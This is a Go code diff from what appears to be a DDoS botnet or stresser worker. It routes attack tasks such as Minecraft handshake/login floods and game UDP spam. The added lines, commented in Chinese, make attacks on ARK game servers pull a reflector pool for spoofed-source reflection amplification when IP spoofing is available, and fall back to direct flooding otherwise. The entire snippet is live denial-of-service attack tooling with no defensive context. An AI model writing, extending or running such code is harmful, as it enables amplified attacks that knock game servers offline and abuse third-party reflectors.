@@ -1248,6 +1248,11 @@ func (w *Worker) startTask(task *pb.AttackTask) {
 	case "minecraft_handshake", "minecraft_login":
 		session = attack.StartMinecraftAttackEx(cfg)
 	case "game_udp":
+		// ARK 智能攻击：支持伪造时预拉反射器池走反射放大；
+		// 不支持伪造时攻击引擎自动走直连两段式（绝不伪源打自己）
+		if strings.EqualFold(task.Game, "ark") && w.canSpoofIP.Load() {
+			w.fetchReflectorsFromPoolInto(&cfg.Targets, "vse")
+		}
 		session = attack.StartGameUDPSpamEx(cfg)
 	case "combo":
 		w.startComboTask(task)
